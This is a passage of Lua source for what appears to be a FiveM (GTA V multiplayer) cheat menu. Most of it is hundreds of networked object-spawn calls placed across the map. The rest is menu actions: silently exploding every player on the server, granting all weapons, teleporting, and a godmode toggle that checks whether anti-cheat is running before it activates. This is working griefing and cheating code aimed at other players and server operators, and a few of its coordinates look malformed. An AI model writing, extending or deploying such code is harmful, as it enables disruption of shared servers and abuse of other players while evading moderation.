        CreateObject(566160949, -447.78247070312, -1119.4261474609, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -69.776672363281, -1102.8891601562, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -41.347259521484, -1108.5306396484, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -29.609386444092, -1111.0249023438, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -15.035027503967, -1096.1140136719, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -14.407356262207, -1083.1418457031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -29.862161636353, -1079.0012207031, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -44.758968353271, -1079.9376220703, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -48.290916442871, -1087.099609375, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -40.295188903809, -10.8798828125, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 117.76248931885, -1072.2593994141, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 151.98278808594, -1078.2232666016, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 277.51858520508, -1041.4940185547, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 396.16189575195, -1026.4309082031, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 434.78796386719, -1016.8736572266, 27.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 442.57867431641, -979.51953125, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 442.89279174805, -994.14184570312, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 447.28280639648, -1011.4274902344, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 218.35737609863, -945.61590576172, 31.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 302.07806396484, -581.76257324219, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 308.75802612305, -583.85064697266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 317.50579833984, -595.49517822266, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 335.30206298828, -596.66156005859, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 341.23889160156, -595.78839111328, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 364.81823730469, -591.33355712891, 43.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 325.32833862305, -213.14144897461, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 330.37448120117, -191.72790527344, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 349.14260864258, -208.07083129883, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 337.06558227539, -241.4069519043, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 298.30191040039, -224.37821960449, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 285.634765625, -216.46199035645, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 262.62716674805, -198.80781555176, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 245.96669006348, -186.02375793457, 56.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 916.44506835938, 37.975803375244, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 936.10784912109, 65.433235168457, 82.435195922852, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -175.96006774902, 851.95654296875, 232.2336730957, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -378.96408081055, -665.22149658203, 37.331523895264, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -400.55596923828, -684.08380126953, 38.648769378662, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -424.40484619141, -683.000976562, 41.7034034729, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -454.91082763672, -659.82568359375, 32.939640045166, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -526.60095214844, -655.23120117188, 33.032760620117, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -548.05670166016, -652.36499023438, 33.029022216797, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -549.81390380859, -697.82177734375, 33.038799285889, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -545.24224853516, -727.92510986328, 32.671539306641, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -520.80108642578, -754.56994628906, 31.823480606079, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -512.77209472656, -787.97338867188, 30.698291778564, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -511.87390136719, -818.08868408203, 30.118923187256, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -529.15905761719, -836.0380859375, 30.150640487671, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -551.88409423828, -832.03967285156, 28.91349029541, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -585.46600341797, -826.14312744141, 27.006490707397, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -610.14520263672, -821.81286621094, 25.464250564575, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -628.9306640625, -803.87738037109, 24.981843948364, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -637.81195068359, -785.80139160156, 25.130237579346, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -633.58489990234, -758.08648681641, 26.000982284546, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -629.87268066406, -734.35369873047, 27.382390975952, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -634.79791259766, -715.943359375, 28.945636749268, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -640.24420166016, -696.60284423828, 30.309741973877, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -634.990234375, -678.34259033203, 31.290117263794, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -628.08715820312, -654.33892822266, 31.468461990356, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -622.80981445312, -636.04864501953, 31.568452835083, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -624.82916259766, -617.20471191406, 32.589164733887, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -628.06488037109, -587.33911132812, 34.198680877686, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -631.78466796875, -571.66296386719, 34.756660461426, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -643.56799316406, -549.61889648438, 34.542552947998, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -640.8134765625, -537.90405273438, 34.997482299805, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -635.07604980469, -513.45190429688, 35.664726257324, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -628.10278320312, -421.34710693359, 34.564311981201, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -629.86151123047, -401.3056640625, 34.559482574463, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -631.65686035156, -380.25494384766, 34.561431884766, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -619.43371582031, -365.70248413086, 36.288410186768, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -613.52569580078, -337.9553527832, 36.612091064453, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -601.14410400391, -329.03750610352, 35.440940856934, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -623.30218505859, -322.57138061523, 36.568145751953, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -651.68695068359, -315.99667358398, 35.298564910889, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -660.08483886719, -294.44018554688, 35.33576965332, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -669.49005126953, -270.23934936523, 35.905090332031, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -675.63958740234, -254.40756225586, 36.236812591553, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -685.41461181641, -235.52954101562, 36.507305145264, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -699.59857177734, -220.75393676758, 36.83130645752, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -720.09216308594, -231.41983032227, 36.841335296631, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -744.83020019531, -244.68208312988, 36.840751647949, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -763.2548828125, -249.6580657959, 37.007606506348, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -788.52966308594, -256.30065917969, 37.245109558105, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -802.20819091797, -253.92761230469, 36.788028717041, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -808.58575439453, -242.59887695312, 37.036464691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -820.70690917969, -214.9810333252, 37.704189300537, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -830.81787109375, -191.96983337402, 37.444049835205, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -844.55413818359, -175.86039733887, 37.463500976562, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -858.94464111328, -159.00291442871, 37.669784545898, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -876.65307617188, -170.47099304199, 38.014739990234, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -901.49310302734, -183.6675567627, 37.530975341797, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -921.02185058594, -194.07048034668, 37.495845794678, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -944.10266113281, -195.88412475586, 37.495014190674, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -968.55554199219, -200.96894836426, 37.222003936768, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -988.82012939453, -220.45167541504, 37.907089233398, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1024.4562988281, -241.43873596191, 37.525581359863, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1085.2475585938, -274.20718383789, 37.617164611816, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1103.4658203125, -269.15484619141, 37.867721557617, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1126.8005371094, -281.48663330078, 38.657535552979, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1148.359375, -292.28182983398, 38.791648864746, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1170.48828125, -291.85784912109, 38.992107391357, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1193.6276855469, -291.40768432617, 38.889110565186, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1218.7214355469, -290.92233276367, 37.657947540283, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1233.4307861328, -303.12777709961, 37.736988067627, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1248.2092285156, -315.27133178711, 37.84058380127, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1267.5900878906, -331.3115234375, 36.98416519165, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1283.8361816406, -344.75610351562, 36.470161437988, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1305.3353271484, -356.01519775391, 36.613246917725, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1334.1020507812, -360.79891967773, 36.65678024292, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1350.9398193359, -363.59573364258, 36.494960784912, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1367.2520751953, -379.93838500977, 36.652248382568, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1380.2022705078, -394.00366210938, 36.445823669434, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1402.9261474609, -398.17565917969, 36.796722412109, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1423.9675292969, -410.1028137207, 36.635139465332, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1441.4888916016, -420.03536987305, 36.128063201904, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1453.7445068359, -426.98056030273, 35.317489624023, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1475.6639404297, -439.37313842773, 35.271514892578, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1489.6983642578, -447.29193115234, 35.367473602295, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1501.1840820312, -453.77963256836, 35.336555480957, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1519.5579833984, -464.14825439453, 35.0448608398, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1533.578125, -472.01034545898, 35.126083374023, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1548.4698486328, -480.34732055664, 35.123199462891, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1560.7679443359, -487.18835449219, 35.087757110596, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1563.197265625, -499.99365234375, 35.675567626953, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1581.5412597656, -515.58569335938, 35.297256469727, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1605.193359375, -520.12579345703, 34.724109649658, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1688.1834716797, -528.16271972656, 40.576705932617, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1721.0336914062, -510.43545532227, 40.12907409668, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1741.0587158203, -501.48364257812, 38.634918212891, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1756.7415771484, -481.97271728516, 40.477088928223, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1769.8996582031, -465.51202392578, 41.534847259521, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1782.4383544922, -449.83868408203, 41.548976898193, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1804.0675048828, -439.05447387695, 42.195014953613, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1819.3243408203, -431.49542236328, 42.949752807617, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1831.8289794922, -425.26312255859, 43.874549865723, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1853.2891845703, -414.64498901367, 45.302425384521, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1868.5047607422, -407.18606567383, 46.350208282471, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1885.1983642578, -384.8176574707, 48.292461395264, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1890.3519287109, -366.56503295898, 48.854564666748, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1884.8326416016, -352.58810424805, 49.027431488037, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1876.5070800781, -331.61865234375, 47.802089691162, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1846.9636230469, -276.33001708984, 46.736312866211, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1819.0274658203, -325.36376953125, 45.809062957764, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1815.0964355469, -339.87322998047, 45.582927703857, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1808.5787353516, -364.11291503906, 44.005798339844, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1802.4747314453, -385.29006958008, 42.198215484619, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1790.9311523438, -428.03890991211, 38.48904800415, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1788.2253417969, -444.82955932617, 36.995174407959, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1784.5886230469, -467.58825683594, 34.884159088135, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1779.6987304688, -498.20559692383, 32.018699645996, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1774.1787109375, -532.76300048828, 28.706546783447, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1769.2905273438, -563.36108398438, 25.689037322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1766.2933349609, -582.12066650391, 23.8088016501, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1768.0249023438, -628.46899414062, 10.519196510315, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1759.4582519531, -646.53729248047, 10.309303283691, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1751.3765869141, -663.78558349609, 10.14768409729, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1740.7327880859, -686.55798339844, 10.167251586914, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1713.8133544922, -719.93347167969, 10.937111854553, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1696.1872558594, -733.31097412109, 11.090492248535, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1676.1856689453, -748.51867675781, 9.9981365203857, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1665.0916748047, -758.46258544922, 12.244045257568, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1647.5239257812, -776.37884521484, 13.427575111389, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1651.6759033203, -799.07305908203, 12.3508644104, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1656.9287109375, -823.55224609375, 10.77232170105, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1662.8148193359, -850.9658203125, 8.9593496322632, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1666.8171386719, -869.54602050781, 8.6330251693726, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1671.4582519531, -891.08728027344, 8.290337562561, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1676.3131103516, -913.60424804688, 7.8747358322144, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1679.9108886719, -930.2587890625, 7.4615921974182, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1684.5755615234, -951.86242675781, 7.5586032867432, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1689.5715332031, -975.40484619141, 6.8873271942139, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1693.1550292969, -992.03637695312, 6.3932785987854, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1657.939453125, -1028.4793701172, 12.766311645508, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1674.8597412109, -1044.0367431641, 12.859534263611, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1688.9105224609, -1056.8914794922, 12.827094078064, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1706.6948242188, -1073.1491699219, 12.829881668091, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1842.8005371094, -1232.2490234375, 12.765271186829, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1859.7833251953, -1221.6228027344, 13.040806770325, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1879.8327636719, -1201.8630371094, 13.140325546265, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1818.8970947266, -1244.9155273438, 16.184650421143, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1667.5478515625, -1112.1121826172, 15.34307384491, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1488.2962646484, -956.50500488281, 8.6661567687988, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1481.39453125, -965.09893798828, 9.0651473999023, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1442.4974365234, -02.0303344727, 8.0529880523682, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1426.8947753906, -1020.1224975586, 4.8073205947876, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1409.9012451172, -1039.7980957031, 4.3698844909668, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1390.2004394531, -1062.5466308594, 3.8684072494507, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1375.0466308594, -1080.0139160156, 3.980809211731, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1366.4007568359, -1114.6849365234, 8.4048643112183, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1364.3050537109, -1128.5925292969, 8.2246036529541, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1360.8507080078, -1151.4663085938, 7.1339063644409, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1358.1575927734, -1169.2646484375, 5.4720897674561, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1357.9407958984, -1197.0061035156, 4.2607550621033, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1361.3116455078, -1217.8570556641, 4.3437147140503, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1355.15234375, -1240.2905273438, 4.6479821205139, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1345.3043212891, -1262.2491455078, 6.5375714302063, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1335.3063964844, -1284.5822753906, 7.0228791236877, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1330.1655273438, -1297.8234863281, 6.3680057525635, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1324.9270019531, -1331.2257080078, 5.0359969139099, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1317.7286376953, -1348.9234619141, 5.4501256942749, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1308.4112548828, -1374.6842041016, 4.6584057807922, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1301.1278076172, -1396.6988525391, 4.1395206451416, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1294.0227050781, -1418.3414306641, 4.158908367157, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1276.6690673828, -1437.6485595703, 4.460620880127, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1262.9663085938, -1456.3391113281, 4.6627221107483, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1250.4888916016, -1473.3486328125, 4.041736125946, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1240.3615722656, -1487.1064453125, 4.0352692604065, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1218.2188720703, -1517.1315917969, 4.1369280815125, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1212.6579589844, -1549.1138916016, 4.4212770462036, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1202.3359375, -1566.4606933594, 4.8673343658447, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -1039.8928222656, -1397.20830078, 5.301194190979, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -205.97943115234, -1307.7111816406, 32.463283538818, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -208.08169555664, -1322.1918945312, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -210.46829223633, -1332.6993408203, 30.6383934021, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 87.46117401123, -1925.2875976562, 22.540056228638, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 101.1555557251, -1933.6849365234, 23.343391418457, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 114.682762146, -1942.3416748047, 22.059331893921, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 91.787879943848, -1947.1599121094, 22.13903427124, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -96.82292175293, -1583.6147460938, 31.914810180664, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -165.88885498047, -1669.705078125, 32.914325714111, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -131.21087646484, -1583.7025146484, 33.982086181641, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, -564.41174316406, 272.36557006836, 84.375846862793, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 376.63070678711, 322.68417358398, 103.56887054443, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 435.130305859, 216.90020751953, 102.91343688965, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 462.97250366211, 242.70608520508, 105.35186767578, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 463.30364990234, 252.55215454102, 107.32363891602, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 437.65286254883, 266.67935180664, 103.01537322998, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 429.43933105469, 250.82200622559, 105.63001251221, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 961.47344970703, -137.86401367188, 74.19605255127, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 980.24877929688, -127.23160552979, 73.605422973633, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 968.25885009766, -118.1788482666, 74.214859008789, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 988.52282714844, -112.56884002686, 74.228507995605, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 988.68646240234, -101.54683685303, 74.598121643066, true, true, true)
            Citizen.Wait(0)
        CreateObject(566160949, 980.42834472656, -105.61399841309, 74.69669342041, true, true, true)
        end)
        
        elseif data['Text'] == 'Delete attached' then
            for k, v in pairs(GetStuff('Object')) do
                if IsEntityAttachedToEntity(v, PlayerPedId()) then
                    CreateThread(function()
                        while DoesEntityExist(v) do
                            Wait(0)
                            DetachEntity(v, false, false)
                            while not NetworkHasControlOfEntity(v) do
                                NetworkRequestControlOfEntity(v)
                                Wait(0)
                            end
                            SetEntityAsMissionEntity(v, true, true)
                            DeleteEntity(v)
                            Wait(100)
                        end
                    end)
                end
            end
        elseif data['Text'] == 'Teleport to waypoint' then
            CreateThread(function()
                local waypoint = GetFirstBlipInfoId(8)

                if DoesBlipExist(waypoint) then
                    local coords = GetBlipInfoIdCoord(waypoint).xy

                    for height = 1, 1000 do
                        SetPedCoordsKeepVehicle(PlayerPedId(), coords.x, coords.y, height + 0.0)

                        local found, height = GetGroundZFor_3dCoord(coords.x, coords.y, height + 0.0)

                        if found then
                            SetPedCoordsKeepVehicle(PlayerPedId(), coords.x, coords.y, height + 0.0)

                            break
                        end

                        Wait(0)
                    end

                end
            end)
        elseif data['Text'] == '✈️ Airplane' then
            Airplane()
        elseif data['Text'] == '🚘 Vehicle Shop' then
            VehicleShop()
        elseif data['Text'] == '🏪 Shop' then
            Shop()
        elseif data['Text'] == '🏥 Hospital' then
            Hospital()
        elseif data['Text'] == '🏢 Motel' then
            Motel()
        elseif data['Text'] == '🚔 LSPD' then
            LSPD()
        elseif data['Text'] == 'LS Customs' then
            ls()
        elseif data['Text'] == 'Main Garage' then
            gp()
        elseif data['Text'] == 'Clothes Shop' then
            shopclothes()
        elseif data['Text'] == 'Barber' then
            barber()
        elseif data['Text'] == 'Teleport to coords' then
            menuvisiblewdqdq = false
            CreateThread(function()
                local x = tonumber(KeyboardInput('~g~What X coordinate?', '', 30))
                if x then
                    local y = tonumber(KeyboardInput('~g~What Y coordinate?', '', 30))
                    if y then
                        local z = tonumber(KeyboardInput('~g~What Z coordinate?', '', 30))
                        if z then
                            SetPedCoordsKeepVehicle(PlayerPedId(), x + 0.0, y + 0.0, z + 0.0)
                            Wait(250)
                            local timer = GetGameTimer() + 5000
                            while not HasCollisionLoadedAroundEntity(PlayerPedId()) do
                                Wait(0)
                                SetPedCoordsKeepVehicle(PlayerPedId(), x + 0.0, y + 0.0, z + 0.0)
                                if timer <= GetGameTimer() then
                                    break
                                end
                            end
                        end
                    end
                end
                menuvisiblewdqdq = true
            end)     
        elseif data['Text'] == 'Explode everyone (silent)' then
            for k, v in pairs(allplayers) do
                local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                AddExplosion(GetEntityCoords(pped), 34, 500.0, false, true, false, false)
            end
        elseif data['Text'] == 'Give all weapons' then
            for k, v in pairs(weapons) do
                GiveWeaponToPed(PlayerPedId(), GetHashKey(v), 250, false, false)
            end
        elseif data['Text'] == 'Remove all weapons' then
            RemoveAllPedWeapons(PlayerPedId())
        end   
    end
end

CreateThread(function()
    while true do
        local me = PlayerPedId()
        for k, v in pairs(Toggles) do
            if k == 'Invisible' then
                SetEntityVisible(me, not v, false)
            elseif k == 'godmode' then
                if v == 'off' then
                    SetEntityInvincible(me, false)
                    SetPlayerInvincible(PlayerId(), false)
                    SetEntityProofs(me, false, false, false, false, false, false, false, false)
                    SetEntityCanBeDamaged(me, true)
                elseif v == 'godmode' then
                    if not anticheatrunning then
                        SetEntityInvincible(me, true)
                        SetPlayerInvincible(PlayerId(), true)
                        SetEntityProofs(me, true, true, true, true, true, true, true, true)
                        SetEntityCanBeDamaged(me, false)
                    else
                        AnticheatWarning()
                    end
                elseif v == 'safe' then
                    SetEntityInvincible(me, false)
                    SetPlayerInvincible(PlayerId(), false)
                    SetEntityProofs(me, false, false, false, false, false, false, false, false)
